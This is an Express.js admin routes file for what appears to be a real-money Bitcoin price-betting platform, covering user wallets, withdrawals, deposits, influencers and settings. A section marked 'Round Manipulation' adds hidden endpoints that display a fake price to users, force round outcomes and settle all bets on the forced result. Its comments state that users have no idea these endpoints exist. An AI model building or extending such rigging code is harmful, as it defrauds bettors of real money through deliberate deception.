
// server/routes/admin.js
const express = require('express');
const router = express.Router();

// Import all admin controllers
const {
  // Dashboard
  getDashboardStats,

  // Users
  getAllUsers,
  getUserDetails,
  updateUserStatus,
  creditUserWallet,
  debitUserWallet,

  // Transactions
  getAllTransactions,

  // Withdrawals
  getPendingWithdrawals,
  processWithdrawal,

  // Deposits
  getAmountMismatches,
  approveAmountMismatch,

  // Rounds
  getAllRounds,
  getRoundDetailsAdmin,
  cancelRound,

  // ✅ NEW — Round Manipulation
  setRoundManipulation,
  clearRoundManipulation,
  getManipulationStatus,
  forceEndRound,

  // Settings
  getSettings,
  updateSettings,

  // Influencer Management
  getAllInfluencers,
  getInfluencerDetails,
  upgradeToInfluencer,
  updateInfluencerPercentage,
  downgradeInfluencer,
  getReferralStats,
  searchUsersForInfluencer,

  // System
  getSystemHealth,
  clearCache

} = require('../controllers/adminController');

// Middleware
const { protect } = require('../middleware/auth');
const { adminOnly } = require('../middleware/adminAuth');

// =====================================================
// AUTHENTICATION MIDDLEWARE
// All admin routes require authentication + admin role
// =====================================================
router.use(protect);
router.use(adminOnly);

// =====================================================
// DASHBOARD
// =====================================================
router.get('/dashboard', getDashboardStats);

// =====================================================
// USER MANAGEMENT
// =====================================================
router.get('/users', getAllUsers);
router.get('/users/search', searchUsersForInfluencer);
router.get('/users/:userId', getUserDetails);
router.put('/users/:userId/status', updateUserStatus);
router.post('/users/:userId/credit', creditUserWallet);
router.post('/users/:userId/debit', debitUserWallet);

// =====================================================
// TRANSACTIONS
// =====================================================
router.get('/transactions', getAllTransactions);

// =====================================================
// WITHDRAWALS
// =====================================================
router.get('/withdrawals/pending', getPendingWithdrawals);
router.put('/withdrawals/:transactionId', processWithdrawal);

// =====================================================
// DEPOSITS
// =====================================================
router.get('/deposits/mismatches', getAmountMismatches);
router.post('/deposits/approve-mismatch/:reference', approveAmountMismatch);

// =====================================================
// ROUNDS — EXISTING
// =====================================================
router.get('/rounds', getAllRounds);
router.get('/rounds/:roundId/details', getRoundDetailsAdmin);
router.put('/rounds/:roundId/cancel', cancelRound);

// =====================================================
// ✅ NEW — ROUND MANIPULATION (Admin Only)
// These routes are protected — only admin can access
// Users have NO idea these endpoints exist
// =====================================================

// GET  — See all active/locked rounds + manipulation status
//        Admin sees: real price vs fake price, forced results
//        Admin sees: cancel button for every active round
router.get('/rounds/manipulation/status', getManipulationStatus);

// POST — Activate manipulation on a round
//        Body: { overridePrice, forcedResult, note }
//        overridePrice → fake price users see on chart
//        forcedResult  → 'up' or 'down' forced at round end
//        note          → internal admin note (never shown to users)
router.post('/rounds/:roundId/manipulate', setRoundManipulation);

// DELETE — Clear/remove manipulation from a round
//          Price immediately returns to real BTC market price
//          All manipulation fields cleared from DB
router.delete('/rounds/:roundId/manipulate', clearRoundManipulation);

// POST — Force end a round with chosen result RIGHT NOW
//        Body: { result: 'up' or 'down', reason }
//        Settles all bets immediately with forced result
//        Admin uses this when they want round to end early
router.post('/rounds/:roundId/force-end', forceEndRound);

// =====================================================
// SETTINGS
// =====================================================
router.get('/settings', getSettings);
router.put('/settings', updateSettings);

// =====================================================
// INFLUENCER MANAGEMENT
// =====================================================
router.get('/influencers', getAllInfluencers);
router.get('/influencers/:userId', getInfluencerDetails);
router.post('/influencers/:userId', upgradeToInfluencer);
router.put('/influencers/:userId', updateInfluencerPercentage);
router.delete('/influencers/:userId', downgradeInfluencer);

// =====================================================
// REFERRAL STATS
// =====================================================
router.get('/referrals/stats', getReferralStats);

// =====================================================
// SYSTEM
// =====================================================
router.get('/system/health', getSystemHealth);
router.post('/system/clear-cache', clearCache);

// =====================================================
// EXPORT
// =====================================================
module.exports = router;
